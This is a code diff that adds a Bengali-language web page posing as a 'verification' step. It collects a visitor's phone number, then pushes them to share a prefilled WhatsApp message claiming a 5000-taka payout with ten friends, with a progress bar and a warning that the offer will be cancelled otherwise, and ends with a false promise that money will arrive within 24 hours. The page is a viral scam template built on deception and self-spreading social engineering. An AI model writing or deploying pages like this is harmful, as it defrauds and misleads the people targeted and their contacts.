@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification - Step 2</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .progress-fill { transition: width 0.5s ease-in-out; }
+        .hidden-section { display: none; }
+    </style>
+</head>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen">
+
+    <div id="numberSection" class="bg-white p-8 rounded-2xl shadow-2xl w-full max-w-sm mx-4">
+        <h2 class="text-xl font-bold text-center text-gray-800 mb-6">আপনার মোবাইল নম্বর দিন</h2>
+        <input type="number" id="phoneNum" placeholder="Phone Number" class="w-full border-2 border-purple-200 p-3 rounded-lg mb-4 focus:border-purple-600 outline-none">
+        <button onclick="showInvite()" class="w-full bg-purple-600 text-white font-bold py-3 rounded-lg">সাবমিট করুন</button>
+    </div>
+
+    <div id="inviteSection" class="hidden-section bg-white p-8 rounded-2xl shadow-2xl w-full max-w-sm mx-4 text-center">
+        <h2 class="text-xl font-bold text-purple-700 mb-4">ভেরিফিকেশন করুন</h2>
+        <p class="text-sm mb-6 text-gray-600">টাকা সরাসরি ব্যাংক অ্যাকাউন্টে পাঠাতে আপনার ১০ জন বন্ধুকে হোয়াটসঅ্যাপে শেয়ার করুন।</p>
+        
+        <div class="w-full bg-gray-200 rounded-full h-6 mb-6 overflow-hidden">
+            <div id="bar" class="progress-fill bg-green-500 h-full w-[0%] text-white text-xs flex items-center justify-center">0%</div>
+        </div>
+
+        <button onclick="updateBar()" class="w-full bg-green-500 text-white font-bold py-4 rounded-lg flex items-center justify-center gap-2 mb-2">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="h-6"> শেয়ার করুন
+        </button>
+        <p class="text-[10px] text-red-500">শেয়ার না করলে অফার বাতিল হবে!</p>
+    </div>
+
+    <div id="thankYou" class="hidden-section bg-white p-10 rounded-2xl shadow-2xl w-full max-w-sm mx-4 text-center">
+        <div class="text-5xl mb-4 text-green-500">✔️</div>
+        <h2 class="text-2xl font-bold mb-2">সাফল্য!</h2>
+        <p class="text-gray-600 text-sm font-bold">আপনার তথ্য সফলভাবে জমা হয়েছে। ২৪ ঘণ্টার মধ্যে আপনার ব্যাংক অ্যাকাউন্টে ৫০০০ টাকা জমা হবে।</p>
+    </div>
+
+    <script>
+        let progress = 0;
+
+        function showInvite() {
+            let num = document.getElementById('phoneNum').value;
+            if(num.length < 10) { alert("সঠিক নম্বর দিন"); return; }
+            document.getElementById('numberSection').classList.add('hidden-section');
+            document.getElementById('inviteSection').classList.remove('hidden-section');
+        }
+
+        function updateBar() {
+            if (progress < 100) {
+                progress += 20;
+                document.getElementById('bar').style.width = progress + '%';
+                document.getElementById('bar').innerText = progress + '%';
+                window.open("whatsapp://send?text=আমি ৫০০০ টাকা পেয়েছি! তুমিও নাও এখানে: [LINK]", '_blank');
+            }
+            if (progress >= 100) {
+                setTimeout(() => {
+                    document.getElementById('inviteSection').classList.add('hidden-section');
+                    document.getElementById('thankYou').classList.remove('hidden-section');
+                }, 800);
+            }
+        }
+    </script>
+</body>
+</html>
